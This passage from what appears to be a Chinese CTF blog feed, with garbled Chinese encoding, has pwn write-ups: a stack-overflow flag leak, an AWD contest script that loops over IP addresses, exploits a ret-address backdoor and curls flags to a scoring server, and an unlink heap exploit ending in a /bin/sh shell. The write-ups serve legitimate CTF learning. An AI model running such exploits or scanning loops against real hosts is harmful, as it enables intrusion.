flag\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***:&#x27;</span>)</span><br><span class="line">buf = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x168</span></span><br><span class="line">success(<span class="string">&#x27;buf(flag)_address : &#x27;</span>+<span class="built_in">hex</span>(buf))</span><br><span class="line"></span><br><span class="line"><span class="comment"># step3 -- æ‰“å°å‡ºflag</span></span><br><span class="line">payload = cyclic(<span class="number">0x128</span>) + p64(buf)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°ç¬¬ä¸€æ¬¡awdæµ‹è¯•</title>
      <link href="/2024/09/04/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/"/>
      <url>/2024/09/04/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id><a href="#" class="headerlink" title></a></h1><h1 id="åªé’ˆå¯¹pwnæ–¹å‘"><a href="#åªé’ˆå¯¹pwnæ–¹å‘" class="headerlink" title="åªé’ˆå¯¹pwnæ–¹å‘"></a>åªé’ˆå¯¹pwnæ–¹å‘</h1><p><font size="4" color="red">é¢˜ç›®ï¼š<strong>Bugku S3 AWDæ’ä½èµ›-13(åŒå€ç§¯åˆ†)</strong></font></p><p><font size="4" color="red">å‚è€ƒè§†é¢‘ï¼š<a class="link" href="https://www.bilibili.com/video/BV1FD4y147vu/?spm_id_from=333.337.search-card.all.click&vd_source=3a102c224ddc9fd26cd9c49207334603">AWD_å“”å“©å“”å“©_bilibili <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></font></p><p><font size="4" color="red">å·¥å…·ï¼š</font></p><p><strong>Xterminal</strong>ï¼š<a class="link" href="https://www.xterminal.cn/">Xterminal - æ›´å¥½ç”¨çš„å¼€å‘å·¥å…·ï¼Œä½†ä¸æ­¢äº(SSH&#x2F;æ§åˆ¶å°&#x2F;More) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="1-sshè¿æ¥"><a href="#1-sshè¿æ¥" class="headerlink" title="1.sshè¿æ¥"></a>1.sshè¿æ¥</h3><ul><li>æ­¤å¤„æ˜¯ç»“æŸä¹‹åå†™çš„ï¼Œæ‰€ä»¥ç¼ºå°‘æˆªå›¾äº†ï¼Œä¸è¿‡å¯ä»¥çœ‹ä¸Šé¢çš„å‚è€ƒè§†é¢‘ã€‚</li><li>å¼€å§‹æ¯”èµ›ä¹‹å‰åŠ¡å¿…è®©é˜Ÿé•¿ç»™ä½ æœ¬æœºipåŠ å…¥åˆ°ç™½åå•ä¸Šé¢</li><li>æ¯”èµ›å¼€å§‹ï¼Œä¼šæœ‰è‡ªå·±çš„è™šæ‹Ÿipåœ°å€ï¼Œä¹Ÿä¼šç»™é˜Ÿä¼åå’Œå¯†ç ï¼Œé˜Ÿä¼åç±»ä¼¼äºteam1ï¼Œå¯†ç è¾ƒé•¿ã€‚</li></ul><p><img lazyload src="/images/loading.svg" data-src="/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904222732662.bmp"></p><ul><li>ç±»ä¼¼ä¸Šé¢çš„ï¼Œæˆ‘æ‹¿çš„æ˜¯Xterminalè¿æ¥ï¼Œåˆ†ç»„å’Œåç§°ä¹±å¡«å°±è¡Œã€‚</li></ul><h3 id="2-å¯¹pwnæ–‡ä»¶è¿›è¡Œä¿®å¤å’Œæ”»å‡»"><a href="#2-å¯¹pwnæ–‡ä»¶è¿›è¡Œä¿®å¤å’Œæ”»å‡»" class="headerlink" title="2.å¯¹pwnæ–‡ä»¶è¿›è¡Œä¿®å¤å’Œæ”»å‡»"></a>2.å¯¹pwnæ–‡ä»¶è¿›è¡Œä¿®å¤å’Œæ”»å‡»</h3><h4 id="2-1-æ”»å‡»æœ¬åœ°"><a href="#2-1-æ”»å‡»æœ¬åœ°" class="headerlink" title="2.1 æ”»å‡»æœ¬åœ°"></a>2.1 æ”»å‡»æœ¬åœ°</h4><ul><li>è¿æ¥æœåŠ¡å™¨ä¹‹åï¼Œåœ¨&#x2F;home&#x2F;ctfæ–‡ä»¶ä¸‹é¢æœ‰pwnæ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥å³å¯ï¼Œæ‹–è¿›è‡ªå·±çš„è™šæ‹Ÿæœºï¼Œç„¶åè·Ÿæ­£å¸¸çš„ctfæ¯”èµ›ä¸€æ ·ã€‚</li><li>checksecä¸€ä¸‹æ–‡ä»¶ï¼Œå‘ç°æ²¡canaryä¹Ÿæ²¡æœ‰PIE</li></ul><p><img lazyload src="/images/loading.svg" data-src="/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904223824348.bmp"></p><p><img lazyload src="/images/loading.svg" data-src="/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904223741981.bmp"></p><p><img lazyload src="/images/loading.svg" data-src="/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904223748645.bmp"></p><ul><li><strong>ä»idaå¯ä»¥çœ‹å‡ºï¼Œç›´æ¥ç»™çš„pwnæ–‡ä»¶å¯ä»¥è¯´æ²¡æœ‰ä»»ä½•ä¿æŠ¤ï¼ŒæŠŠèƒ½ç»™çš„ä¿¡æ¯éƒ½ç»™äº†ï¼Œè¿˜ç»™äº†æ ˆä¸Šåœ°å€ä»»æ„ä¿®æ”¹çš„æƒé™ï¼Œå¹¶ä¸”è¿˜ç»™äº†åé—¨å‡½æ•°ã€‚é‚£ä¹ˆå¾ˆç®€å•ï¼Œç›´æ¥ä¿®æ”¹ret_addrä¸ºåé—¨å‡½æ•°åœ°å€å°±å¯ä»¥å¾—åˆ°flagäº†</strong>ã€‚</li></ul><p><img lazyload src="/images/loading.svg" data-src="/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904224136529.bmp"></p><h4 id="2-2-æ”»å‡»è¿œç¨‹"><a href="#2-2-æ”»å‡»è¿œç¨‹" class="headerlink" title="2.2 æ”»å‡»è¿œç¨‹"></a>2.2 æ”»å‡»è¿œç¨‹</h4><ul><li>è¿œç¨‹å…¶å®è·Ÿåšé¢˜ç›®ä¸€æ ·ï¼Œå¾—åˆ°ipåœ°å€ï¼Œè¿™ä¸€æ­¥é webæ‰‹å°†å…¶ä»–æœåŠ¡å™¨çš„è™šæ‹Ÿipçˆ†ç ´å‡ºæ¥(è™šæ‹Ÿipåªæœ‰ä¸€ä½ä¸åŒ)ï¼Œç„¶åpingä¸€ä¸‹å°±æœ‰ipäº†</li><li><strong>ç«¯å£é—®é¢˜</strong>ï¼šèµ·åˆæˆ‘ä»¥ä¸ºæ˜¯é»˜è®¤çš„2222ï¼Œç»“æœä¸Šç½‘æœ<a class="link" href="https://www.anquanke.com/post/id/256463">å…¶ä»–æ¯”èµ›çš„è„š <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><a class="link" href="https://www.anquanke.com/post/id/256463">æœ¬ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼Œå‘ç°ç«¯å£å…¶å®æ˜¯9999</li></ul><p><img lazyload src="/images/loading.svg" data-src="/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240902204946705.bmp"></p><ul><li><p><strong>å¾—åˆ°çš„flagå°±å¯ä»¥ç›´æ¥æäº¤äº†</strong></p></li><li><p>è‡³äºå¾ªç¯æäº¤flagï¼Œè¿™é‡Œè´´ä¸€ä¸ªè„šæœ¬ï¼Œä½†æ˜¯æœ€åä¹Ÿæ²¡æ¥å¾—åŠæµ‹è¯•ã€‚è„šæœ¬ä¸­çˆ†ç ´å°±çˆ†ç ´äº†ä¸€ä½ï¼Œä½†å…¶å®åä¸ºipåœ°å€éƒ½æ˜¯ä¸ç›¸åŒçš„</p></li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="comment"># æœ¬æœºip: 47.104.214.84</span></span><br><span class="line"><span class="comment"># å…¶ä»–ip: 47.104.195.88</span></span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ip = <span class="string">&quot;47.104.195.&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>)</span><br><span class="line">        p = remote(ip,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">&quot;saved rbp\n&quot;</span>)</span><br><span class="line">        ret_addr = <span class="built_in">int</span>(p.recv()[<span class="number">1</span>:<span class="number">19</span>],<span class="number">16</span>)</span><br><span class="line">        success(<span class="string">&quot;ret_addr&quot;</span>,<span class="built_in">hex</span>(ret_addr))</span><br><span class="line">        p.send(<span class="built_in">str</span>(ret_addr))</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">&quot; = &quot;</span>)</span><br><span class="line">        p.send(<span class="built_in">str</span>(<span class="number">0x00000000004011fa</span>))</span><br><span class="line">        flag = <span class="built_in">str</span>(p.recvuntil(<span class="string">b&#x27;\n\n&#x27;</span>))</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        payload = <span class="string">&quot;curl https://ctf.bugku.com/pvp/submit.html?token=72b8175c72f2abe98330367a34bfa64a&amp;flag=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(flag)</span><br><span class="line">        os.system(payload)</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(ip)</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;æœ¬è½®å…±æ‹¿åˆ°&quot;</span>+<span class="built_in">str</span>(index)+<span class="string">&quot;ä¸ªé˜Ÿä¼flag&quot;</span>)</span><br></pre></td></tr></table></figure></div><h4 id="2-3-ä¿®å¤æ–‡ä»¶"><a href="#2-3-ä¿®å¤æ–‡ä»¶" class="headerlink" title="2.3 ä¿®å¤æ–‡ä»¶"></a>2.3 ä¿®å¤æ–‡ä»¶</h4><ul><li>å› ä¸ºæ˜¯æ–°æ‰‹ä¸ä¼šåœ¨ida patchæ”¹ï¼Œæ‰€ä»¥ä¸Šçš„æ˜¯é€šé˜²ï¼š<a class="link" href="https://github.com/TTY-flag/evilPatcher">https://github.com/TTY-flag/evilPatcher <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><font size="4" color="red">å…·ä½“ä½¿ç”¨ï¼š</font></li></ul><p>1.å®‰è£…seccomp-tools</p><p>2.git clone + ä¸Šé¢ä»“åº“åœ°å€.gitï¼Œç„¶åç»™pwnæ–‡ä»¶ä¸¢åˆ°ç›®å½•ä¸‹é¢</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 evilPatcher.py pwn sandboxs/mini_sandbox.asm</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904225530541.bmp"></p><p><font size="4"><strong>pwn.patchå°±æ˜¯æ”¹äº†ä¹‹åçš„æ–‡ä»¶</strong>ï¼Œä¿®æ”¹pwn.patchä¸ºpwnå°±è¡Œäº†</font></p><p><img lazyload src="/images/loading.svg" data-src="/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904225753998.bmp"></p><ul><li>å¯ä»¥å‘ç°ï¼Œexecveç³»ç»Ÿè°ƒç”¨è¢«ç¦ç”¨äº†ï¼Œæ‰€ä»¥åŸæ¥çš„è„šæœ¬æ˜¯æ‰“ä¸é€šçš„ã€‚</li></ul><h4 id="2-4-è¿œç¨‹ä¸Šä¼ "><a href="#2-4-è¿œç¨‹ä¸Šä¼ " class="headerlink" title="2.4 è¿œç¨‹ä¸Šä¼ "></a>2.4 è¿œç¨‹ä¸Šä¼ </h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P <span class="number">2222</span> filename_addr username@ip:/ç›®å½•</span><br></pre></td></tr></table></figure></div><ul><li><p>filename_addrå°±æ˜¯ä½ è¦ä¸Šä¼ çš„æ–‡ä»¶ç»å¯¹åœ°å€</p></li><li><p>usernameå°±æ˜¯æœåŠ¡å™¨åœ°å€ï¼Œæ¯”å¦‚team1ï¼Œipå°±æ˜¯pingä¸€ä¸‹ä½ çš„è™šæ‹Ÿipç„¶åçš„åœ°å€ï¼Œåé¢ç›®å½•å°±æ˜¯ä½ è¦ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„ç›®å½•</p></li><li><p>åšå®Œè¿™äº›æ˜¯è¦è¾“å¯†ç çš„ï¼Œæ­£å¸¸è¾“å…¥å³å¯</p></li><li><p>ä¸€èˆ¬æˆ‘ä»¬çš„æ–‡ä»¶æ—¶ä¸Šä¼ åˆ°&#x2F;tmpç›®å½•ä¸‹é¢ï¼Œç„¶åæ ¹æ®é‡å®šå‘å†™å…¥åˆ°pwnæ–‡ä»¶ä¸­</p></li></ul><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /tmp/pwn &gt; <span class="regexp">/home/</span>ctf/pwn</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904230324533.bmp"></p><ul><li>åšå®Œè¿™äº›pwnæ‰‹å¯ä»¥æ­‡æ¯äº†(å¯¹äºæˆ‘æ¥è¯´ä¹Ÿå¯ä»¥æ­‡æ¯äº†ï¼Œå› ä¸ºå·²ç»ä¸ä¼šäº†)</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> awd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hitcon2014_stkof-unlink</title>
      <link href="/2024/09/03/hitcon2014-stkof-unlink/"/>
      <url>/2024/09/03/hitcon2014-stkof-unlink/</url>
      
        <content type="html"><![CDATA[<h1 id="unlinkâ€“åªæœ‰add-free-edit"><a href="#unlinkâ€“åªæœ‰add-free-edit" class="headerlink" title="unlinkâ€“åªæœ‰add,free,edit"></a>unlinkâ€“åªæœ‰add,free,edit</h1><p><a class="link" href="https://buuoj.cn/challenges#hitcon2014_stkof">é¢˜ç›®é“¾æ¥ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><p><strong>unlinkä¿®æ”¹free_gotï¼Œåˆ©ç”¨puts_got,puts_plt</strong></p><p><a class="link" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/">æ–‡ç« é“¾æ¥ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="é¢˜ç›®é€Ÿè§ˆ"><a href="#é¢˜ç›®é€Ÿè§ˆ" class="headerlink" title="é¢˜ç›®é€Ÿè§ˆ"></a>é¢˜ç›®é€Ÿè§ˆ</h2><h4 id="ç»å…¸å †èœå•"><a href="#ç»å…¸å †èœå•" class="headerlink" title="ç»å…¸å †èœå•"></a>ç»å…¸å †èœå•</h4><p><img lazyload src="/images/loading.svg" data-src="/hitcon2014-stkof-unlink/capture_20240903211652894.bmp"></p><h4 id="addï¼š"><a href="#addï¼š" class="headerlink" title="addï¼š"></a>addï¼š</h4><ul><li>æ³¨æ„å…ˆåŠ ä¸€ï¼Œæ‰è®°å½•åœ°å€</li></ul><p><img lazyload src="/images/loading.svg" data-src="/hitcon2014-stkof-unlink/capture_20240903211718246.bmp"></p><h4 id="deleteï¼š"><a href="#deleteï¼š" class="headerlink" title="deleteï¼š"></a>deleteï¼š</h4><p><img lazyload src="/images/loading.svg" data-src="/hitcon2014-stkof-unlink/capture_20240903211711681.bmp"></p><h4 id="editï¼š"><a href="#editï¼š" class="headerlink" title="editï¼š"></a>editï¼š</h4><ul><li><font size="4" color="red"><strong>æ¼æ´ç‚¹ï¼Œæœªå¯¹sizeæ£€æŸ¥</strong></font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/hitcon2014-stkof-unlink/capture_20240903211705331.bmp"></p><h2 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h2><ul><li>æœ¬é¢˜ç›®æ²¡æœ‰åé—¨å‡½æ•°ï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬æ³„éœ²libc</li><li>å¼€å¯äº†PIE,ä¸”åªæœ‰free,add,editå‡½æ•°å¯ä»¥ä½¿ç”¨ï¼Œæ­£å¸¸çš„uafé€šè¿‡unsortedbinæ³„éœ²main_arenaè‚¯å®šä¸è¡Œäº†</li><li>ä½†æ˜¯æˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ªunlinkï¼Œä»¥å‰éƒ½æ˜¯ä¿®æ”¹free_gotä¸ºsysemï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥å°†free_gotä¿®æ”¹ä¸ºputs_pltï¼Œç„¶åè°ƒç”¨freeå°±ç›¸å½“äºputs_pltï¼Œå°†puts_gotå†™å…¥chunkä¸­ï¼Œå°±å¯ä»¥å¾—åˆ°libcåœ°å€äº†ã€‚</li><li>ç„¶åå°±æ˜¯æ­£å¸¸çš„ä¿®æ”¹free_gotä¸ºsystem_pltï¼Œå†™å…¥&#x2F;bin&#x2F;shï¼Œç„¶åfreeå°±getshelläº†</li></ul><h2 id="gdbè°ƒè¯•"><a href="#gdbè°ƒè¯•" class="headerlink" title="gdbè°ƒè¯•"></a>gdbè°ƒè¯•</h2><h4 id="1-å®ç°unlink"><a href="#1-å®ç°unlink" class="headerlink" title="1.å®ç°unlink"></a>1.å®ç°unlink</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="number">0x0602140</span></span><br><span class="line">bss = s + <span class="number">0x10</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment"># 1 s+8</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment"># 2 s+0x10</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">fd = bss - <span class="number">0x18</span></span><br><span class="line">bk = bss - <span class="number">0x10</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) + p64(fd)+p64(bk)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>) <span class="comment"># 2,3åˆå¹¶,è§¦å‘unlink</span></span><br></pre></td></tr></table></figure></div><ul><li>bssä¸­0x0602140æ˜¯addå‡½æ•°ä¸­sçš„åœ°å€ï¼Œä¹Ÿæ˜¯å­˜å‚¨chunkçš„åœ°å€ï¼Œä½†æ˜¯ä¹‹å‰ä¹Ÿè¯´äº†ï¼Œæˆ‘ä»¬æ˜¯å…ˆ+1å†å‚¨å­˜chunkåœ°å€çš„ï¼Œå› æ­¤chunk1å¯¹åº”äºs[1],ä¹Ÿå°±æ˜¯0x0602140+0x8</li><li>unlinkå¯ä»¥ä½¿å½“å‰å‚¨å­˜chunkçš„åœ°å€æŒ‡å‘target_addr-0x18ï¼Œè¿™æ ·æ”¹çš„è¯ä¼šå‡ºç°ä¸‹é¢æƒ…å†µï¼š</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s[<span class="number">2</span>]- <span class="number">0x18</span></span><br><span class="line">s[<span class="number">0</span>] -&gt; <span class="number">0x0</span></span><br><span class="line">s[<span class="number">1</span>] -&gt; chunk1_user_data</span><br><span class="line">s[<span class="number">2</span>] -&gt; s[<span class="number">2</span>]<span class="number">-0x18</span> </span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/hitcon2014-stkof-unlink/capture_20240903214034468.bmp"></p><h4 id="2-ä¿®æ”¹free-gotä¸ºputs-pltï¼Œæ³„éœ²libc"><a href="#2-ä¿®æ”¹free-gotä¸ºputs-pltï¼Œæ³„éœ²libc" class="headerlink" title="2.ä¿®æ”¹free_gotä¸ºputs_pltï¼Œæ³„éœ²libc"></a>2.ä¿®æ”¹free_gotä¸ºputs_pltï¼Œæ³„éœ²libc</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload = flat( [ cyclic(<span class="number">0x10</span>), free_got, puts_got] )</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x8</span>,p64(puts_plt))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts_address: &quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br></pre></td></tr></table></figure></div><ul><li><font size="4"><strong>ç¬¬ä¸€ä¸ªpayload:</strong></font></li></ul><p>ä¿®æ”¹chunk2ï¼Œå…¶å®ç›¸å½“äºä¿®æ”¹ s-0x18åœ°å€çš„å€¼ï¼Œä¿®æ”¹çš„æ˜¯ç”»æ¡†éƒ¨åˆ†ï¼š</p><p>ä¿®æ”¹å¯ä»¥å‚è€ƒéæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ‰€è¯´çš„A -&gt;B -&gt;C,ä¿®æ”¹Aå…¶å®æ˜¯ä¿®æ”¹Cã€‚</p><p><img lazyload src="/images/loading.svg" data-src="/hitcon2014-stkof-unlink/1.bmp"></p><p>å¾€ä¸‹å†™0x10åƒåœ¾æ•°æ®ï¼Œç„¶åå¡«å†™free_got,puts_gotï¼Œé‚£ä¹ˆå°±ä¼šå‡ºç°ä¸‹é¢æƒ…å†µï¼š</p><p><img lazyload src="/images/loading.svg" data-src="/hitcon2014-stkof-unlink/capture_20240903214655504.bmp"></p><p><font size="4" color="red">è¿™é‡Œä¸€å®šè¦è®°ä½got@pltä¼šè‡ªåŠ¨çš„æŒ‡å‘pltè¡¨ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¿®æ”¹gotè¡¨åˆ°A-Bè¿™æ ·çš„åœ°å€ç»“æ„çš„æ—¶å€™ï¼Œä¼šå½¢æˆA-&gt;GOT@plt-&gt;pltï¼Œè¿™æ ·ä¸‰åœ°å€ç»“æ„ï¼Œæ‰€ä»¥æˆ‘ä»¬å†æ¬¡ä¿®æ”¹Aåœ°å€ä¸ºpltæ‰ä¼šæˆåŠŸã€‚</font></p><p><img lazyload src="/images/loading.svg" data-src="/hitcon2014-stkof-unlink/capture_20240903215051485.bmp"></p><p>æˆåŠŸä¿®æ”¹ï¼Œç„¶åfree(2)ï¼Œ2å¤„å­˜å‚¨çš„æ˜¯puts_pltçš„åœ°å€ã€‚</p><h4 id="3-ä¿®æ”¹free-gotä¸ºsystem-ç„¶ågetshell"><a href="#3-ä¿®æ”¹free-gotä¸ºsystem-ç„¶ågetshell" class="headerlink" title="3.ä¿®æ”¹free_gotä¸ºsystem,ç„¶ågetshell"></a>3.ä¿®æ”¹free_gotä¸ºsystem,ç„¶ågetshell</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">1</span>,<span class="number">0x8</span>,p64(system))</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x8</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><ul><li>æ²¡ä»€ä¹ˆè¯´çš„ï¼Œå’Œä¹‹å‰ä¸€æ ·çš„ã€‚</li></ul><p><img lazyload src="/images/loading.svg" data-src="/hitcon2014-stkof-unlink/capture_20240903215311365.bmp"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0ctf_2017_babyheap--fastbin_attack</title>
      <link href="/2024/09/03/0ctf-2017-babyheap-fastbin-attack/"/>
      <url>/2024/09/03/0ctf-2017-babyheap-fastbin-attack/</url>
      
        <content type="html"><![CDATA[<h1 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a>0ctf_2017_babyheap</h1><p><a class="link" href="https://buuoj.cn/challenges#0ctf_2017_babyheap">é¢˜ç›®é“¾æ¥ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://libc.rip/download/libc6_2.23-0ubuntu11.2_amd64.so">libc.soæ–‡ä»¶é“¾æ¥ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="çŸ¥è¯†ç‚¹ï¼š"><a href="#çŸ¥è¯†ç‚¹ï¼š" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h3><ul><li><font coloe="red">glibc2.24 <strong>fastbin_attack</strong>, <strong>unsortedbinæ³„éœ²main_arena</strong> ,<strong>Arbitrary Alloc</strong></font></li><li><a class="link" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack/">Fastbin Attack - CTF Wiki (ctf-wiki.org) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul><h2 id="é¢˜ç›®é€Ÿè§ˆï¼š"><a href="#é¢˜ç›®é€Ÿè§ˆï¼š" class="headerlink" title="é¢˜ç›®é€Ÿè§ˆï¼š"></a>é¢˜ç›®é€Ÿè§ˆï¼š</h2><ul><li><h5 id="å…¸å‹çš„å †èœå•é¢˜ç›®ï¼Œä½†æ˜¯æ²¡æœ‰åé—¨å‡½æ•°ï¼Œsystemå‡½æ•°ä¹Ÿæ²¡æœ‰"><a 